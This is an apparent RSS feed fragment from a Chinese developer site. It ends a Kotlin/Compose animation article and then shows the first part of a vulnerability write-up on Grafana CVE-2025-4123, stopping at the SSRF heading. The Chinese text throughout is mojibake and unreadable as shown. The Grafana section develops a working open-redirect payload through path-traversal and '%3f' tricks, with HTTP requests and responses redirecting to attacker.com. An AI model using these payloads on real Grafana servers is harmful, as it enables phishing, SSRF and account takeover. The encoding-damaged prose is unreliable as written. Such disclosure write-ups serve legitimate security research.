    <span class="hljs-comment">// ç¼©æ”¾å› å­ï¼š1.0 ä¸ºæ­£å¸¸ï¼Œ0.0 ä¸ºå…³é—­åŠ¨ç”»ï¼Œ&gt; 1.0 ä¸ºå˜æ…¢</span>
    <span class="hljs-keyword">val</span> scaleFactor: <span class="hljs-built_in">Float</span>
}
</code></pre>
<p><strong>åŸç†ï¼š</strong></p>
<ol>
<li>è¯»å–å¼€å‘è€…é€‰é¡¹çš„"åŠ¨ç”»æ—¶é•¿ç¼©æ”¾"ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ªå®ç°äº† <code>MotionDurationScale</code> çš„ Context Elementã€‚</li>
<li>å°†å…¶åŠ å…¥åˆ° <code>effectCoroutineContext</code> ä¸­ã€‚</li>
<li>åœ¨è®¡ç®—åŠ¨ç”»è¿›åº¦æ—¶ï¼Œä¼šæŸ¥æ‰¾è¿™ä¸ª Element å¹¶åº”ç”¨ç¼©æ”¾ã€‚</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SuspendAnimation.kt (åŠ¨ç”»å®ç°çš„ç®€åŒ–é€»è¾‘)</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">animate</span><span class="hljs-params">(...)</span></span> {
    <span class="hljs-keyword">val</span> scale = coroutineContext[MotionDurationScale]?.scaleFactor ?: <span class="hljs-number">1f</span>
    <span class="hljs-comment">// æ ¹æ® scale è°ƒæ•´æ¯ä¸€å¸§çš„æ—¶é—´å·®</span>
}
</code></pre>
<h2 data-id="heading-43">äº”ã€æ€»ç»“</h2>
<ul>
<li><strong>Composeè¿è¡Œåœ¨ä¸€ä¸ªå¤åˆä¸Šä¸‹æ–‡ä¸­ï¼ŒåŒ…å«Â <code>AndroidUiDispatcher</code>ï¼ˆä¸»çº¿ç¨‹è°ƒåº¦ï¼‰ã€<code>BroadcastFrameClock</code>ï¼ˆå¸§å¹¿æ’­ï¼‰ã€<code>Job</code>ï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰ã€<code>MotionDurationScale</code>ï¼ˆåŠ¨ç”»æ—¶é•¿ç¼©æ”¾ï¼‰ã€‚</strong></li>
<li><strong>åŠ¨ç”»æœ¬è´¨æ˜¯åç¨‹ + å¸§å¾ªç¯ + çŠ¶æ€é©±åŠ¨é‡ç»„ã€‚åŠ¨ç”»åç¨‹é€šè¿‡ç­‰å¾…ä¸‹ä¸€å¸§æŒ‚èµ·ï¼Œå½“ä¸‹ä¸€å¸§æ¥ä¸´åå”¤é†’æ‰€æœ‰åŠ¨ç”»åç¨‹ï¼ŒåŠ¨ç”»åç¨‹æ›´æ–°çŠ¶æ€è§¦å‘é‡ç»„ã€‚</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Grafana CVE-2025-4123æ¼æ´åˆ†æï¼šå…¨è¯»SSRFä¸è´¦æˆ·æ¥ç®¡]]></title>    <link>https://juejin.cn/post/7602420156397404203</link>    <guid>https://juejin.cn/post/7602420156397404203</guid>    <pubDate>2026-02-03T12:28:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397404203" data-draft-id="7602420156397387819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Grafana CVE-2025-4123æ¼æ´åˆ†æï¼šå…¨è¯»SSRFä¸è´¦æˆ·æ¥ç®¡"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-02-03T12:28:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Grafana CVE-2025-4123æ¼æ´åˆ†æï¼šå…¨è¯»SSRFä¸è´¦æˆ·æ¥ç®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:28:52.000Z" title="Tue Feb 03 2026 12:28:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Grafana CVE-2025-4123ï¼šå…¨è¯»SSRFä¸è´¦æˆ·æ¥ç®¡</h2>
<p><strong>æ‘˜è¦</strong></p>
<p>å½“Webåº”ç”¨ç¨‹åºæ¥æ”¶ä¸€ä¸ªURLå‚æ•°ï¼Œå¹¶åœ¨æœªç»éªŒè¯çš„æƒ…å†µä¸‹å°†ç”¨æˆ·é‡å®šå‘åˆ°è¯¥æŒ‡å®šURLæ—¶ï¼Œå°±ä¼šå‘ç”Ÿå¼€æ”¾é‡å®šå‘ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">/redirect?url=https://evil.com --&gt; (302 é‡å®šå‘) --&gt; https://evil.com
</code></pre>
<p>è¿™æœ¬èº«çœ‹èµ·æ¥å¯èƒ½å¹¶ä¸å±é™©ï¼Œä½†æ­¤ç±»æ¼æ´æ˜¯å‘ç°ä¸¤ä¸ªç‹¬ç«‹æ¼æ´çš„èµ·ç‚¹ï¼šä¸€ä¸ªå…¨è¯»SSRFå’Œä¸€ä¸ªè´¦æˆ·æ¥ç®¡æ¼æ´ã€‚</p>
<p>åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†é€æ­¥è¯¦ç»†ä»‹ç»å‘ç°å®ƒä»¬çš„å®Œæ•´è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-1">ä¸ºä»€ä¹ˆé€‰æ‹©Grafanaï¼Ÿ</h4>
<p>Grafanaæ˜¯ä¸€ä¸ªå¼€æºåˆ†æå¹³å°ï¼Œä¸»è¦ä½¿ç”¨Goå’ŒTypeScriptæ„å»ºï¼Œç”¨äºå¯è§†åŒ–æ¥è‡ªPrometheuså’ŒInfluxDBç­‰æ¥æºçš„æ•°æ®ã€‚</p>
<p>æˆ‘è®¤ä¸ºåœ¨è¿™ä¸ªWebåº”ç”¨ç¨‹åºä¸­å¯»æ‰¾æ¼æ´å°†æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æŒ‘æˆ˜ï¼Œå› æ­¤æˆ‘ä¸‹è½½äº†æºä»£ç å¹¶å¼€å§‹è°ƒè¯•â€”â€”å°½ç®¡è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨Goã€‚æˆ‘å†³å®šä¸“æ³¨äºåº”ç”¨ç¨‹åºçš„æœªè®¤è¯éƒ¨åˆ†ã€‚</p>
<h4 data-id="heading-2">å…¥å£ç‚¹ï¼šå¼€æ”¾é‡å®šå‘</h4>
<p>æˆ‘æŸ¥çœ‹äº† <code>api/api.go</code> ä¸­å®šä¹‰çš„æ‰€æœ‰æœªè®¤è¯ç«¯ç‚¹...</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// æœªç™»å½•è§†å›¾</span>
<span class="hljs-selector-tag">r</span><span class="hljs-selector-class">.Get</span>(<span class="hljs-string">"/logout"</span>, hs.Logout)
<span class="hljs-selector-tag">r</span><span class="hljs-selector-class">.Post</span>(<span class="hljs-string">"/login"</span>, requestmeta.<span class="hljs-built_in">SetOwner</span>(requestmeta.TeamAuth), <span class="hljs-built_in">quota</span>(string...
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/login/:name"</span>, <span class="hljs-built_in">quota</span>(<span class="hljs-built_in">string</span>(auth.QuotaTargetSrv)), hs.OAuthLogin)
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/login"</span>, hs.LoginView)
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">""</span>, hs.Index)

<span class="hljs-comment">// å·²è®¤è¯è§†å›¾</span>
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/"</span>, reqSignedIn, hs.Index)
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/profile/"</span>, reqSignedInNoAnonymous, hs.Index)
...
</code></pre>
<h4 data-id="heading-3">åŠŸèƒ½åˆ†æ</h4>
<p>æˆ‘ç”šè‡³æ·±å…¥æŒ–æ˜ä»¥æ£€æŸ¥åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„ä¸­é—´ä»¶ã€‚å°±åœ¨è¿™æ—¶ï¼Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªè´Ÿè´£å¤„ç†é™æ€è·¯ç”±çš„å‡½æ•°â€”â€”å®ƒå¼•èµ·äº†æˆ‘çš„æ³¨æ„ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">staticHandler</span><span class="hljs-params">(ctx *web.Context, log log.Logger, opt StaticOptions)</span></span> <span class="hljs-type">bool</span> {
    <span class="hljs-keyword">if</span> ctx.Req.Method != <span class="hljs-string">"GET"</span> &amp;&amp; ctx.Req.Method != <span class="hljs-string">"HEAD"</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }
    file := ctx.Req.URL.Path
    <span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> opt.Exclude {
        <span class="hljs-keyword">if</span> file == p {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
    }
    <span class="hljs-comment">// å¦‚æœæœ‰å‰ç¼€ï¼Œåˆ™é€šè¿‡å‰¥ç¦»å‰ç¼€æ¥è¿‡æ»¤è¯·æ±‚</span>
    <span class="hljs-keyword">if</span> opt.Prefix != <span class="hljs-string">""</span> {
        <span class="hljs-keyword">if</span> !strings.HasPrefix(file, opt.Prefix) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
        file = file[<span class="hljs-built_in">len</span>(opt.Prefix):]
        <span class="hljs-keyword">if</span> file != <span class="hljs-string">""</span> &amp;&amp; file[<span class="hljs-number">0</span>] != <span class="hljs-string">'/'</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
    }
    f, err := opt.FileSystem.Open(file)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }
    ..............
}
</code></pre>
<p>è¯¥å‡½æ•°ç”¨äºæ ¹æ®ç”¨æˆ·è¾“å…¥ä»ç³»ç»Ÿä¸­æ£€ç´¢æ–‡ä»¶ã€‚è‡ªç„¶åœ°ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯å°è¯•ä½¿ç”¨åƒ <code>../</code> è¿™æ ·çš„è·¯å¾„éå†æŠ€æœ¯åŠ è½½ä»»æ„æ–‡ä»¶ã€‚</p>
<p>æˆ‘å°†å‘ä½ è§£é‡Šæ‰€æœ‰ä»£ç å’Œç°æœ‰å‡€åŒ–æªæ–½çš„æµç¨‹ï¼ˆç†è§£æ¼æ´å¾ˆé‡è¦ï¼‰ï¼š</p>
<p>å› æ­¤ï¼Œå¦‚æœä½ è¯·æ±‚ <code>/public/file/../../../name</code>ï¼Œè·¯å¾„ä¼šè¢«å‡€åŒ–å¹¶è§£æä¸º <code>/staticfiles/etc/etc/name</code>ï¼Œä»è€Œæœ‰æ•ˆåœ°é˜»æ­¢äº†å¯¹ç›®æ ‡ç›®å½•ä¹‹å¤–éé¢„æœŸæ–‡ä»¶çš„è®¿é—®ã€‚</p>
<p>æ­¤å¤–ï¼Œå¦‚æœè§£æåçš„æœ€ç»ˆè·¯å¾„æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œ<code>StaticHandler</code> å‡½æ•°ä¼šæ£€æŸ¥å…¶ä¸­çš„é»˜è®¤æ–‡ä»¶â€”â€”é€šå¸¸ä»è¯¥ç›®å½•æä¾› <code>/index.html</code>ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> fi.IsDir() {
    <span class="hljs-comment">// å¦‚æœç¼ºå°‘å°¾éƒ¨æ–œæ ï¼Œåˆ™é‡å®šå‘ã€‚</span>
    <span class="hljs-keyword">if</span> !strings.HasSuffix(ctx.Req.URL.Path, <span class="hljs-string">"/"</span>) {
        path := fmt.Sprintf(<span class="hljs-string">"%s/"</span>, ctx.Req.URL.Path)
        <span class="hljs-keyword">if</span> !strings.HasPrefix(path, <span class="hljs-string">"/"</span>) {
            <span class="hljs-comment">// æ¾„æ¸…è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹äºæ­¤æœåŠ¡å™¨çš„è·¯å¾„</span>
            path = fmt.Sprintf(<span class="hljs-string">"/%s"</span>, path)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ä»¥ // æˆ– /\ å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«æµè§ˆå™¨è§£é‡Šä¸ºURLï¼Œè€Œä¸æ˜¯æœåŠ¡å™¨ç›¸å¯¹è·¯å¾„</span>
            rePrefix := regexp.MustCompile(<span class="hljs-string">`^(?:/\\|/+)`</span>)
            path = rePrefix.ReplaceAllString(path, <span class="hljs-string">"/"</span>)
        }
        http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    }
    file = path.Join(file, opt.IndexFile)
    indexFile, err := opt.FileSystem.Open(file)
    ....
}
</code></pre>
<p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œå¦‚æœæœ€ç»ˆæ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå¹¶ä¸”æä¾›çš„è·¯ç”±ï¼ˆä¾‹å¦‚ <code>/public/build</code>ï¼‰ä¸æ˜¯ä»¥ <code>/</code> ç»“å°¾ï¼ŒæœåŠ¡å™¨ä¼šé‡å®šå‘åˆ°é™„åŠ äº†å°¾éƒ¨ <code>/</code> çš„ç›¸åŒè·¯å¾„ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">GET</span> /<span class="hljs-keyword">public</span>/build HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>:<span class="hljs-number">3000</span>

HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> Found
<span class="hljs-symbol">Location:</span> /<span class="hljs-keyword">public</span>/build/
</code></pre>
<p>è¿™ç§é‡å®šå‘è¡Œä¸ºæ­£æ˜¯å¼€æ”¾é‡å®šå‘æ¼æ´å‘ç”Ÿçš„åœ°æ–¹ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è®©æˆ‘ä»¬æ·±å…¥æ¢è®¨ã€‚</p>
<h4 data-id="heading-4">ç›®æ ‡</h4>
<p>æˆ‘æœ‰ä¸€ä¸ªåœºæ™¯ï¼Œåº”ç”¨ç¨‹åºæ ¹æ®æä¾›çš„è·¯ç”±è¿›è¡Œé‡å®šå‘ï¼Œå› æ­¤æœ€ç»ˆçš„é‡å®šå‘URLå°†å§‹ç»ˆä»¥ <code>/</code> å¼€å¤´ã€‚æˆ‘çš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ªè·¯ç”±ï¼Œå½“è¢«è¯·æ±‚æ—¶ï¼Œé‡å®šå‘åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„å®Œæ•´URLï¼Œå¹¶ä¸”è¯¥URLä¹Ÿä»¥ <code>/</code> å¼€å¤´ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">//attacker.com/...    --&gt; `//` è¡¨ç¤ºåè®®ç›¸å¯¹URLï¼Œä½¿ç”¨ä¸å½“å‰é¡µé¢ç›¸åŒçš„åè®®ï¼ˆHTTPSï¼‰
/\attacker.com/...     --&gt; `/\` åšåŒæ ·çš„äº‹æƒ…
</code></pre>
<h4 data-id="heading-5">é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h4>
<p><strong>æœ‰æ•ˆçš„ç›®å½•</strong></p>
<p>ä¸ºäº†è§¦å‘é‡å®šå‘åŠŸèƒ½ï¼Œæˆ‘éœ€è¦ä¸€ä¸ªä»¥ <code>/public/</code> å¼€å¤´çš„è·¯ç”±ï¼Œå¹¶ä¸”å½“ä¼ é€’ç»™ <code>opt.FileSystem.Open(file)</code> æ—¶ï¼Œè¯¥è·¯ç”±èƒ½è§£æä¸ºä¸€ä¸ªæœ‰æ•ˆçš„ç›®å½•ã€‚</p>
<p>æˆ‘ä» <code>/public/\attacker.com/../..</code> å¼€å§‹ï¼Œå®ƒè§£æä¸ºç©ºå­—ç¬¦ä¸² <code>""</code>ï¼Œç„¶åé™„åŠ åˆ° <code>/staticfiles/etc/etc/</code>ï¼Œè§¦å‘ <code>if fi.isDir(){}</code> ä»£ç æµã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript">/<span class="hljs-keyword">public</span>/\attacker.<span class="hljs-property">com</span>/../.. --&gt; <span class="hljs-regexp">/\attacker.com/</span>../.. --&gt; <span class="hljs-string">""</span> --&gt; <span class="hljs-regexp">/staticfiles/</span>etc/etc/ + <span class="hljs-string">""</span> --&gt; fi.<span class="hljs-title function_">isDir</span>() <span class="hljs-variable constant_">TRUE</span>
</code></pre>
<p>ç°åœ¨ï¼Œæˆ‘æœ‰äº†ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥æ³¨å…¥ä»»ä½•å°†è¢« <code>opt.FileSystem.Open(file)</code> è§£é‡Šä¸ºæ–‡ä»¶å¤¹çš„æœ‰æ•ˆè½½è·ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">/public/{}/../..
</code></pre>
<p><strong>ä¸ä¸€è‡´æ€§</strong></p>
<p>ä¸€æ—¦è¿›å…¥ <code>isDir()</code> éƒ¨åˆ†ï¼Œ<code>/public/\attacker.com/../..</code> è·¯å¾„å°±åˆ°è¾¾äº† <code>http.Redirect()</code> å‡½æ•°ã€‚é—®é¢˜æ˜¯è¿™ä¸ªå‡½æ•°ä¹Ÿä¼šè§£æè·¯å¾„ï¼Œå¯¼è‡´é‡å®šå‘è·¯å¾„å˜ä¸º <code>/</code>ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> fi.IsDir() {
    ...
    <span class="hljs-comment">// path æ˜¯ "/public/\attacker.com/../.." ä½†æœ€ç»ˆé‡å®šå‘æ˜¯ "/"</span>
    http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    ...
}
</code></pre>
<p>å¦‚æœæˆ‘è¯·æ±‚ <code>/public/\attacker.com/../..</code></p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">GET</span> /<span class="hljs-keyword">public</span>/\attacker.com/../.. HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>:<span class="hljs-number">3000</span>

HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> Found
<span class="hljs-symbol">Location:</span> /
</code></pre>
<p>æ‰€ä»¥ï¼ŒåŸºæœ¬ä¸Šï¼Œ<strong>æˆ‘éœ€è¦åˆ›å»ºä¸€ä¸ªè·¯ç”±ï¼Œå…¶ä¸­ <code>/../..</code> åœ¨åŠ è½½æ–‡ä»¶æ—¶è¢« <code>opt.FileSystem.Open(file)</code> è§£æï¼Œä½†åœ¨æ‰§è¡Œé‡å®šå‘æ—¶ <code>http.Redirect()</code> ä¸­ä¸è¢«è§£æã€‚</strong></p>
<p>è·¯å¾„åœ¨æ¯ç§æƒ…å†µä¸‹è¢«è§£æçš„æ–¹å¼ä¸åŒã€‚</p>
<ul>
<li><code>opt.FileSystem.Open(file)</code> æœŸæœ›ä¸€ä¸ªç³»ç»Ÿæ–‡ä»¶è·¯å¾„ã€‚</li>
<li><code>http.Redirect(path)</code> æœŸæœ›ä¸€ä¸ªURLè·¯å¾„ã€‚</li>
</ul>
<p>é—®é¢˜å°±æ˜¯ç­”æ¡ˆï¼Ÿ</p>
<ul>
<li><code>opt.FileSystem.Open(file)</code> å°† <code>?</code> è§†ä¸ºæ™®é€šå­—ç¬¦ã€‚</li>
<li><code>http.Redirect(path)</code> å°† <code>?</code> è§£é‡Šä¸ºURLå‚æ•°çš„å¼€å§‹ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ <code>/public/\attacker.com/?/../../../..</code> å°†è¿™æ ·è¢«å¤„ç†ï¼š</p>
<p>åœ¨ <code>opt.FileSystem.Open()</code> ä¸­ --&gt; <code>/public/\attacker.com/?/../../../..</code> è§£æä¸º <code>""</code> --&gt; <code>/staticfiles/etc/etc/</code> + <code>""</code> æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶å¤¹ã€‚</p>
<p>åœ¨ <code>http.Redirect()</code> ä¸­ â†’ <code>/public/\attacker.com/?/../../../..</code> --&gt; <code>?</code> ä¹‹åçš„ä»»ä½•å†…å®¹éƒ½è¢«è§†ä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œä¸ä½œä¸ºè·¯å¾„çš„ä¸€éƒ¨åˆ†è¿›è¡Œè§£æã€‚</p>
<p>ä½¿ç”¨ <code>?</code> -&gt; <code>%3f</code> è¿›è¡Œè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-variable constant_">GET</span> /<span class="hljs-keyword">public</span>/\attacker.<span class="hljs-property">com</span>/%3f/../.. <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span>
<span class="hljs-title class_">Host</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.2</span>:<span class="hljs-number">3000</span>

<span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-regexp">/public/</span>\attacker.<span class="hljs-property">com</span>/?<span class="hljs-regexp">/../</span>..
</code></pre>
<p><strong>æœ€ç»ˆæœ‰æ•ˆè½½è·</strong></p>
<p>URL <code>/public/\attacker.com/?/../../../..</code> éœ€è¦è¢«è§£æä¸ºä¸€ä¸ªä»¥ <code>/\</code> å¼€å¤´çš„å®Œæ•´URLã€‚</p>
<p>æˆ‘ç®€å•åœ°ä½¿ç”¨äº†è¿™ä¸ªè·¯å¾„ï¼š<code>/public/../\attacker.com/?/../../../..</code></p>
<p>å½“ http.Redirect() è§£æè·¯å¾„æ—¶ï¼Œå®ƒä¼šç§»é™¤ <code>/public</code> éƒ¨åˆ†ã€‚</p>
<p>è¯·æ±‚ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-variable constant_">GET</span> /<span class="hljs-keyword">public</span>/../\attacker.<span class="hljs-property">com</span>/%3f/../../../../../.. <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span>
<span class="hljs-title class_">Host</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.2</span>:<span class="hljs-number">3000</span>

<span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-regexp">/\attacker.com/</span>?<span class="hljs-regexp">/../</span>../../../../..
</code></pre>
<h4 data-id="heading-6">å…¨è¯»SSRF</h4>
